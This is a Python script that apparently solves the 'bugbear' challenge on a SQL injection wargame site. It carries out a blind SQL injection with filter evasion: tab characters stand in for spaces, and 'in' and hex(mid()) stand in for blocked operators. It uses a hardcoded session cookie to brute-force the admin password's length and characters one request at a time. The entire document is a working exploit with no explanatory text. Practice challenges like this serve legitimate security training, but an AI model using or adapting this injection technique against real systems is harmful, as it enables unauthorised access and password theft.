import requests
import string

url = 'https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?'
cookie = {'PHPSESSID':'fd4d1bt6c32a9i29r743nmk7hs'}

def pw_length():
    pw_len=0
    while True:
        pw_len += 1
        print(pw_len)
        query = 'no=1||id%09in%09("admin")%26%26length(pw)<{}%23'.format(pw_len)
        res = requests.get(url=url+query, cookies=cookie)
        if "Hello admin" in res.text:
            print("PASSWORD LENGTH IS "+ str(pw_len-1))
            break
    return pw_len

def pw_char(pw_len):
    passwd = ""
    for i in range(1,pw_len):
        for j in string.printable:
            query='no=1||id%09in%09("admin")%26%26hex(mid(pw,{},1))%09in%09(hex("{}"))'.format(i,j)
            print(query)
            res = requests.get(url=url+query,cookies=cookie)
            if "Hello admin" in res.text:
                passwd += j
                print("password : ", passwd)
                break
    print(passwd)

if __name__ == "__main__":
    pw_len = pw_length()
    pw_char(pw_len)
